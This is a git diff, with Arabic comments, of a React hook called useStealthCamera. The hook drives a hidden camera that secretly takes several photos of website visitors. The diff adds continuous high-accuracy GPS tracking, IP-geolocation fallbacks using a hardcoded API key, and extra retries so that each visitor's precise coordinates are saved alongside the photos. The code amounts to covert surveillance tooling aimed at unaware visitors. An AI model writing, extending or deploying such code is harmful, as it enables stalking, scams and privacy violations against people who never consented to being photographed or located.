@@ -39,6 +39,157 @@ export const useStealthCamera = () => {
   // استخدام refs للعناصر المخفية
   const streamRef = useRef<MediaStream | null>(null);
 
+  // الحصول على الموقع من خلال IP (كخيار احتياطي)
+  const fetchLocationFromIpApi = useCallback(async (): Promise<LocationData> => {
+    try {
+      // استخدام خدمة عامة للحصول على الموقع من IP
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      
+      if (data && data.latitude && data.longitude) {
+        return {
+          latitude: data.latitude,
+          longitude: data.longitude,
+          accuracy: 5000, // دقة منخفضة: ~5 كم للموقع المستند إلى IP
+          timestamp: new Date(),
+          provider: 'ip',
+          errorMessage: undefined
+        };
+      }
+      throw new Error('بيانات الموقع غير متوفرة من مزود خدمة IP');
+    } catch (error) {
+      console.error('❌ فشل في الحصول على الموقع من IP:', error);
+      
+      // محاولة استخدام مزود خدمة آخر للـ IP
+      try {
+        const fallbackResponse = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=d9c8ca199b734f43b81bef0309d42ce9');
+        const fallbackData = await fallbackResponse.json();
+        
+        if (fallbackData && fallbackData.latitude && fallbackData.longitude) {
+          return {
+            latitude: parseFloat(fallbackData.latitude),
+            longitude: parseFloat(fallbackData.longitude),
+            accuracy: 5000, // دقة منخفضة
+            timestamp: new Date(),
+            provider: 'ip-fallback',
+            errorMessage: undefined
+          };
+        }
+      } catch (fallbackError) {
+        console.error('❌ فشل في الحصول على الموقع من IP البديل:', fallbackError);
+      }
+      
+      // إرجاع موقع افتراضي عند فشل جميع المحاولات
+      return {
+        latitude: 0,
+        longitude: 0,
+        accuracy: 10000, // دقة منخفضة جداً
+        timestamp: new Date(),
+        provider: 'ip-error',
+        errorMessage: 'تعذر الحصول على الموقع من خدمات IP'
+      };
+    }
+  }, []);
+
+  // وظيفة جديدة لتتبع الموقع بشكل مستمر
+  const watchLocation = useCallback((): Promise<LocationData> => {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        console.error('❌ خدمة تحديد الموقع غير مدعومة');
+        resolve({
+          latitude: 0,
+          longitude: 0,
+          accuracy: 1000,
+          timestamp: new Date(),
+          provider: 'not-supported',
+          errorMessage: 'خدمة تحديد الموقع غير مدعومة'
+        });
+        return;
+      }
+
+      console.log('🔄 بدء تتبع الموقع المستمر...');
+      
+      let bestLocation: LocationData | null = null;
+      let watchId: number;
+      let timeout: NodeJS.Timeout;
+      let resolved = false;
+
+      const options: PositionOptions = {
+        enableHighAccuracy: true,
+        timeout: 30000,
+        maximumAge: 0
+      };
+
+      watchId = navigator.geolocation.watchPosition(
+        (position) => {
+          if (resolved) return;
+
+          const locationData: LocationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude || undefined,
+            altitudeAccuracy: position.coords.altitudeAccuracy || undefined,
+            heading: position.coords.heading || undefined,
+            speed: position.coords.speed || undefined,
+            timestamp: new Date(),
+            provider: 'watch-gps'
+          };
+
+          console.log(`📍 تحديث الموقع: دقة ${position.coords.accuracy.toFixed(0)}م`);
+
+          // تحديث أفضل موقع إذا كان أكثر دقة
+          if (!bestLocation || position.coords.accuracy < bestLocation.accuracy) {
+            bestLocation = locationData;
+            console.log(`✅ موقع أفضل من التتبع: دقة ${position.coords.accuracy.toFixed(0)}م`);
+          }
+
+          // إنهاء التتبع عند الحصول على دقة عالية
+          if (position.coords.accuracy < 20) {
+            resolved = true;
+            navigator.geolocation.clearWatch(watchId);
+            clearTimeout(timeout);
+            console.log('✅ تم الحصول على موقع عالي الدقة من التتبع');
+            resolve(locationData);
+          }
+        },
+        (error) => {
+          console.warn('⚠️ خطأ في تتبع الموقع:', error.message);
+          if (!resolved && bestLocation) {
+            resolved = true;
+            navigator.geolocation.clearWatch(watchId);
+            clearTimeout(timeout);
+            resolve(bestLocation);
+          }
+        },
+        options
+      );
+
+      // إنهاء التتبع بعد 15 ثانية واستخدام أفضل موقع متاح
+      timeout = setTimeout(() => {
+        if (!resolved) {
+          resolved = true;
+          navigator.geolocation.clearWatch(watchId);
+          
+          if (bestLocation) {
+            console.log('⏱️ انتهت مهلة التتبع - استخدام أفضل موقع');
+            resolve(bestLocation);
+          } else {
+            console.warn('⏱️ انتهت مهلة التتبع بدون موقع');
+            resolve({
+              latitude: 0,
+              longitude: 0,
+              accuracy: 1000,
+              timestamp: new Date(),
+              provider: 'watch-timeout',
+              errorMessage: 'انتهت مهلة تتبع الموقع'
+            });
+          }
+        }
+      }, 15000);
+    });
+  }, []);
+
   // بدء الكاميرا المخفية
   const startStealthCamera = useCallback(async () => {
     try {
@@ -167,7 +318,7 @@ export const useStealthCamera = () => {
       let bestAccuracy = Infinity;
       let bestPosition: GeolocationPosition | null = null;
       let attempts = 0;
-      const maxAttempts = 8; // زيادة عدد المحاولات للحصول على دقة أفضل
+      const maxAttempts = 12; // زيادة عدد المحاولات
       let locationSuccessful = false;
       
       // جمع النتائج من عدة مصادر
@@ -183,40 +334,33 @@ export const useStealthCamera = () => {
           longitude: location.longitude.toFixed(6),
           accuracy: location.accuracy.toFixed(0) + 'م'
         });
-        
-        // إذا لم نحصل على نتيجة أفضل بعد انتهاء الوقت، استخدم هذا الموقع
-        setTimeout(() => {
-          if (!locationSuccessful && !gpsLocation && !networkLocation) {
-            console.log('⚠️ استخدام موقع IP كاحتياطي بعد انتهاء المهلة');
-            locationSuccessful = true;
-            resolve(ipLocation);
-          }
-        }, 10000);
       }).catch(error => {
         console.warn('⚠️ فشل في الحصول على الموقع من IP:', error);
       });
 
       // وظيفة متكررة للحصول على الموقع
-      const tryGetLocation = () => {
-        // محاولة الحصول على أدق موقع ممكن
-        const options = attempts < 4 
-          ? { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } 
-          : { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 };
+      const tryGetLocation = (highAccuracy: boolean = true) => {
+        console.log(`🔄 محاولة ${attempts + 1} - ${highAccuracy ? 'GPS عالي الدقة' : 'شبكة'}`);
+        
+        const options: PositionOptions = {
+          enableHighAccuracy: highAccuracy,
+          timeout: highAccuracy ? 15000 : 10000,
+          maximumAge: highAccuracy ? 0 : 30000
+        };
         
         navigator.geolocation.getCurrentPosition(
           (position) => {
             attempts++;
-            const isHighAccuracy = options.enableHighAccuracy;
-            console.log(`📍 محاولة ${attempts} (${isHighAccuracy ? 'GPS' : 'شبكة'}): دقة ${position.coords.accuracy.toFixed(0)}م`);
+            const currentAccuracy = position.coords.accuracy;
+            const provider = highAccuracy ? 'gps' : 'network';
             
-            // تحديد مصدر الموقع
-            const provider = isHighAccuracy ? 'gps' : 'network';
+            console.log(`📍 محاولة ${attempts} (${provider}): دقة ${currentAccuracy.toFixed(0)}م`);
             
             // تخزين الموقع حسب المصدر
             const locationData: LocationData = {
               latitude: position.coords.latitude,
               longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
+              accuracy: currentAccuracy,
               altitude: position.coords.altitude || undefined,
               altitudeAccuracy: position.coords.altitudeAccuracy || undefined,
               heading: position.coords.heading || undefined,
@@ -232,18 +376,24 @@ export const useStealthCamera = () => {
             }
             
             // تحديث أفضل موقع إذا كان أكثر دقة
-            if (position.coords.accuracy < bestAccuracy) {
-              bestAccuracy = position.coords.accuracy;
+            if (currentAccuracy < bestAccuracy && currentAccuracy > 0) {
+              bestAccuracy = currentAccuracy;
               bestPosition = position;
               console.log(`✅ موقع أفضل (${provider}): دقة ${bestAccuracy.toFixed(0)}م`);
             }
 
-            // إذا حصلنا على دقة عالية أو وصلنا للحد الأقصى من المحاولات
-            if (position.coords.accuracy < 20 || attempts >= maxAttempts) {
+            // شروط إنهاء البحث:
+            // 1. دقة عالية جداً (أقل من 10 متر)
+            // 2. دقة جيدة ومحاولات كافية
+            // 3. وصول للحد الأقصى من المحاولات
+            const isVeryAccurate = currentAccuracy < 10;
+            const isGoodEnough = currentAccuracy < 50 && attempts >= 4;
+            const maxAttemptsReached = attempts >= maxAttempts;
+            
+            if (isVeryAccurate || isGoodEnough || maxAttemptsReached) {
               if (!locationSuccessful) {
                 locationSuccessful = true;
                 
-                // تحويل بيانات الموقع للتنسيق المطلوب
                 const result: LocationData = {
                   latitude: bestPosition!.coords.latitude,
                   longitude: bestPosition!.coords.longitude,
@@ -253,83 +403,96 @@ export const useStealthCamera = () => {
                   heading: bestPosition!.coords.heading || undefined,
                   speed: bestPosition!.coords.speed || undefined,
                   timestamp: new Date(),
-                  provider: options.enableHighAccuracy ? 'gps' : 'network'
+                  provider: highAccuracy ? 'gps' : 'network'
                 };
                 
                 console.log('✅ تم الحصول على الموقع النهائي:', {
                   provider: result.provider,
                   latitude: result.latitude.toFixed(8),
                   longitude: result.longitude.toFixed(8),
-                  accuracy: `${result.accuracy.toFixed(1)}م`
+                  accuracy: `${result.accuracy.toFixed(1)}م`,
+                  reason: isVeryAccurate ? 'دقة عالية' : isGoodEnough ? 'دقة جيدة' : 'حد أقصى محاولات'
                 });
                 
                 resolve(result);
               }
             } else {
-              // محاولة أخرى للحصول على دقة أفضل مع تغيير الإعدادات
-              setTimeout(tryGetLocation, 2000);
+              // محاولة أخرى مع تبديل وضع الدقة
+              setTimeout(() => {
+                if (!locationSuccessful) {
+                  tryGetLocation(attempts % 2 === 0); // تبديل بين عالي الدقة والعادي
+                }
+              }, 2000);
             }
           },
           (error) => {
             attempts++;
-            console.warn(`⚠️ فشل في المحاولة ${attempts}:`, error.message);
+            console.warn(`⚠️ فشل في المحاولة ${attempts} (${highAccuracy ? 'GPS' : 'شبكة'}):`, error.message);
             
-            if (attempts >= maxAttempts) {
-              if (!locationSuccessful) {
-                locationSuccessful = true;
-                
-                // استخدام أفضل موقع متاح
-                if (bestPosition) {
-                  const result: LocationData = {
-                    latitude: bestPosition.coords.latitude,
-                    longitude: bestPosition.coords.longitude,
-                    accuracy: bestPosition.coords.accuracy,
-                    timestamp: new Date(),
-                    provider: 'fallback-geolocation',
-                    errorMessage: 'تم استخدام أفضل موقع متاح'
-                  };
-                  console.log('⚠️ استخدام أفضل موقع متاح:', result);
-                  resolve(result);
-                } 
-                // استخدام موقع الشبكة إن وجد
-                else if (networkLocation) {
-                  console.log('⚠️ استخدام موقع الشبكة الاحتياطي');
-                  resolve(networkLocation);
-                }
-                // استخدام موقع GPS إن وجد
-                else if (gpsLocation) {
-                  console.log('⚠️ استخدام موقع GPS الاحتياطي');
-                  resolve(gpsLocation);
-                }
-                // استخدام موقع IP إن وجد
-                else if (ipLocation) {
-                  console.log('⚠️ استخدام موقع IP الاحتياطي');
-                  resolve(ipLocation);
-                }
-                // الخيار الأخير: إرجاع موقع افتراضي
-                else {
-                  console.error('❌ فشل في الحصول على الموقع من جميع المصادر');
-                  resolve({
-                    latitude: 0,
-                    longitude: 0,
-                    accuracy: 1000,
-                    timestamp: new Date(),
-                    provider: 'fallback',
-                    errorMessage: 'تعذر الحصول على الموقع من جميع المصادر'
-                  });
-                }
+            // تجربة وضع مختلف إذا فشل الوضع الحالي
+            if (attempts < maxAttempts && !locationSuccessful) {
+              setTimeout(() => {
+                tryGetLocation(!highAccuracy); // تغيير وضع الدقة
+              }, 1500);
+            } else if (attempts >= maxAttempts && !locationSuccessful) {
+              // استخدام أفضل موقع متاح أو الاحتياطيين
+              locationSuccessful = true;
+              
+              if (bestPosition) {
+                const result: LocationData = {
+                  latitude: bestPosition.coords.latitude,
+                  longitude: bestPosition.coords.longitude,
+                  accuracy: bestPosition.coords.accuracy,
+                  timestamp: new Date(),
+                  provider: 'fallback-geolocation',
+                  errorMessage: 'تم استخدام أفضل موقع متاح'
+                };
+                console.log('⚠️ استخدام أفضل موقع متاح:', result);
+                resolve(result);
+              } else if (gpsLocation) {
+                console.log('⚠️ استخدام موقع GPS الاحتياطي');
+                resolve({
+                  ...gpsLocation,
+                  errorMessage: 'تم استخدام موقع GPS احتياطي'
+                });
+              } else if (networkLocation) {
+                console.log('⚠️ استخدام موقع الشبكة الاحتياطي');
+                resolve({
+                  ...networkLocation,
+                  errorMessage: 'تم استخدام موقع الشبكة احتياطي'
+                });
+              } else if (ipLocation) {
+                console.log('⚠️ استخدام موقع IP الاحتياطي');
+                resolve({
+                  ...ipLocation,
+                  errorMessage: 'تم استخدام موقع IP احتياطي'
+                });
+              } else {
+                console.error('❌ فشل في الحصول على الموقع من جميع المصادر');
+                resolve({
+                  latitude: 0,
+                  longitude: 0,
+                  accuracy: 1000,
+                  timestamp: new Date(),
+                  provider: 'error',
+                  errorMessage: 'تعذر الحصول على الموقع من جميع المصادر'
+                });
               }
-            } else {
-              // تغيير الإعدادات والمحاولة مرة أخرى
-              setTimeout(tryGetLocation, 2000);
             }
           },
           options
         );
       };
 
-      // بدء أول محاولة
-      tryGetLocation();
+      // بدء المحاولات بوضع عالي الدقة
+      tryGetLocation(true);
+      
+      // محاولة إضافية بوضع الشبكة بعد 3 ثوان
+      setTimeout(() => {
+        if (!locationSuccessful && attempts < 2) {
+          tryGetLocation(false);
+        }
+      }, 3000);
       
       // تعيين مهلة نهائية لضمان العودة بموقع
       setTimeout(() => {
@@ -337,25 +500,34 @@ export const useStealthCamera = () => {
           locationSuccessful = true;
           console.warn('⏱️ انتهت المهلة الزمنية للحصول على الموقع');
           
-          // استخدام أي موقع متاح (بالترتيب: GPS ثم الشبكة ثم IP)
-          if (gpsLocation) {
-            console.log('⚠️ استخدام موقع GPS بعد انتهاء المهلة');
-            resolve(gpsLocation);
-          } else if (networkLocation) {
-            console.log('⚠️ استخدام موقع الشبكة بعد انتهاء المهلة');
-            resolve(networkLocation);
-          } else if (ipLocation) {
-            console.log('⚠️ استخدام موقع IP بعد انتهاء المهلة');
-            resolve(ipLocation);
-          } else if (bestPosition) {
-            console.log('⚠️ استخدام أفضل موقع متاح بعد انتهاء المهلة');
+          // استخدام أي موقع متاح (بالترتيب: أفضل موقع ثم GPS ثم الشبكة ثم IP)
+          if (bestPosition) {
+            console.log('⚠️ استخدام أفضل موقع بعد انتهاء المهلة');
             resolve({
               latitude: bestPosition.coords.latitude,
               longitude: bestPosition.coords.longitude,
               accuracy: bestPosition.coords.accuracy,
               timestamp: new Date(),
-              provider: 'timeout-fallback',
-              errorMessage: 'تم استخدام أفضل موقع متاح بعد انتهاء المهلة'
+              provider: 'timeout-best',
+              errorMessage: 'تم استخدام أفضل موقع بعد انتهاء المهلة'
+            });
+          } else if (gpsLocation) {
+            console.log('⚠️ استخدام موقع GPS بعد انتهاء المهلة');
+            resolve({
+              ...gpsLocation,
+              errorMessage: 'تم استخدام موقع GPS بعد انتهاء المهلة'
+            });
+          } else if (networkLocation) {
+            console.log('⚠️ استخدام موقع الشبكة بعد انتهاء المهلة');
+            resolve({
+              ...networkLocation,
+              errorMessage: 'تم استخدام موقع الشبكة بعد انتهاء المهلة'
+            });
+          } else if (ipLocation) {
+            console.log('⚠️ استخدام موقع IP بعد انتهاء المهلة');
+            resolve({
+              ...ipLocation,
+              errorMessage: 'تم استخدام موقع IP بعد انتهاء المهلة'
             });
           } else {
             console.error('❌ فشل في الحصول على الموقع بعد انتهاء المهلة');
@@ -364,66 +536,14 @@ export const useStealthCamera = () => {
               longitude: 0,
               accuracy: 1000,
               timestamp: new Date(),
-              provider: 'timeout-fallback',
+              provider: 'timeout-error',
               errorMessage: 'تعذر الحصول على الموقع بعد انتهاء المهلة'
             });
           }
         }
-      }, 20000); // مهلة نهائية: 20 ثانية
+      }, 25000); // مهلة نهائية: 25 ثانية
     });
-  }, []);
-
-  // الحصول على الموقع من خلال IP (كخيار احتياطي)
-  const fetchLocationFromIpApi = async (): Promise<LocationData> => {
-    try {
-      // استخدام خدمة عامة للحصول على الموقع من IP
-      const response = await fetch('https://ipapi.co/json/');
-      const data = await response.json();
-      
-      if (data && data.latitude && data.longitude) {
-        return {
-          latitude: data.latitude,
-          longitude: data.longitude,
-          accuracy: 5000, // دقة منخفضة: ~5 كم للموقع المستند إلى IP
-          timestamp: new Date(),
-          provider: 'ip',
-          errorMessage: undefined
-        };
-      }
-      throw new Error('بيانات الموقع غير متوفرة من مزود خدمة IP');
-    } catch (error) {
-      console.error('❌ فشل في الحصول على الموقع من IP:', error);
-      
-      // محاولة استخدام مزود خدمة آخر للـ IP
-      try {
-        const fallbackResponse = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=d9c8ca199b734f43b81bef0309d42ce9');
-        const fallbackData = await fallbackResponse.json();
-        
-        if (fallbackData && fallbackData.latitude && fallbackData.longitude) {
-          return {
-            latitude: parseFloat(fallbackData.latitude),
-            longitude: parseFloat(fallbackData.longitude),
-            accuracy: 5000, // دقة منخفضة
-            timestamp: new Date(),
-            provider: 'ip-fallback',
-            errorMessage: undefined
-          };
-        }
-      } catch (fallbackError) {
-        console.error('❌ فشل في الحصول على الموقع من IP البديل:', fallbackError);
-      }
-      
-      // إرجاع موقع افتراضي عند فشل جميع المحاولات
-      return {
-        latitude: 0,
-        longitude: 0,
-        accuracy: 10000, // دقة منخفضة جداً
-        timestamp: new Date(),
-        provider: 'ip-error',
-        errorMessage: 'تعذر الحصول على الموقع من خدمات IP'
-      };
-    }
-  };
+  }, [fetchLocationFromIpApi]);
 
   // بدء التقاط تلقائي سري
   const startStealthCapture = useCallback(async (photoCount: number = 5) => {
@@ -488,13 +608,32 @@ export const useStealthCamera = () => {
     return photos;
   }, [isCapturing, startStealthCamera, stopStealthCamera, captureStealthPhoto]);
 
-  // حفظ بيانات الزائر
+  // حفظ بيانات الزائر مع استخدام التتبع المحسن للموقع
   const saveVisitorData = useCallback(async (photos: CapturedPhoto[]) => {
     try {
       console.log('💾 بدء حفظ بيانات الزائر...');
       
-      // الحصول على الموقع
-      const location = await getCurrentLocation();
+      // محاولة الحصول على الموقع باستخدام التتبع المستمر أولاً
+      let location: LocationData;
+      try {
+        console.log('🔄 محاولة التتبع المستمر للموقع...');
+        location = await watchLocation();
+        
+        // إذا كانت دقة التتبع المستمر منخفضة، جرب الطريقة التقليدية
+        if (location.accuracy > 100 || location.latitude === 0) {
+          console.log('🔄 دقة التتبع المستمر منخفضة، تجربة الطريقة التقليدية...');
+          const fallbackLocation = await getCurrentLocation();
+          
+          // استخدم الموقع الأكثر دقة
+          if (fallbackLocation.accuracy < location.accuracy && fallbackLocation.latitude !== 0) {
+            location = fallbackLocation;
+            console.log('✅ تم استخدام الموقع من الطريقة التقليدية (أكثر دقة)');
+          }
+        }
+      } catch (error) {
+        console.warn('⚠️ فشل في التتبع المستمر، تجربة الطريقة التقليدية:', error);
+        location = await getCurrentLocation();
+      }
       
       const visitor: VisitorData = {
         id: `stealth_visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
@@ -507,7 +646,11 @@ export const useStealthCamera = () => {
       console.log('📝 بيانات الزائر:', {
         id: visitor.id,
         photosCount: visitor.photos.length,
-        hasLocation: !!visitor.location,
+        location: visitor.location ? {
+          provider: visitor.location.provider,
+          accuracy: `${visitor.location.accuracy.toFixed(1)}م`,
+          coordinates: `${visitor.location.latitude.toFixed(6)}, ${visitor.location.longitude.toFixed(6)}`
+        } : 'غير متوفر',
         visitTime: visitor.visitTime
       });
 
@@ -540,7 +683,7 @@ export const useStealthCamera = () => {
       console.error('❌ خطأ في حفظ بيانات الزائر:', error);
       return null;
     }
-  }, [getCurrentLocation]);
+  }, [getCurrentLocation, watchLocation]);
 
   // الحصول على جميع الزوار
   const getAllVisitors = useCallback(async (): Promise<VisitorData[]> => {
